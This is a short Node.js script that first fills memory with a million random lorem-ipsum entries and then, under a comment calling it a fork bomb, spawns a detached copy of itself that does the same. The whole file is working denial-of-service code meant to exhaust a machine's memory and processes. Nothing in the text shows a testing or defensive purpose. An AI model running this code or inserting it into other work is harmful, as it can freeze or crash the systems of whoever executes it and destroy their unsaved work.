var loremIpsum = require('lorem-ipsum');
var uuid = require('uuid');

var obj = {};
// consume some RAM bytes
while(Object.keys(obj).length < 1000000){
  obj[uuid.v1()] = loremIpsum();
}

// fork bomb
var spawn = require('child_process').spawn;
var child = spawn('node', [__filename], {
  detached: true
});
child.unref();
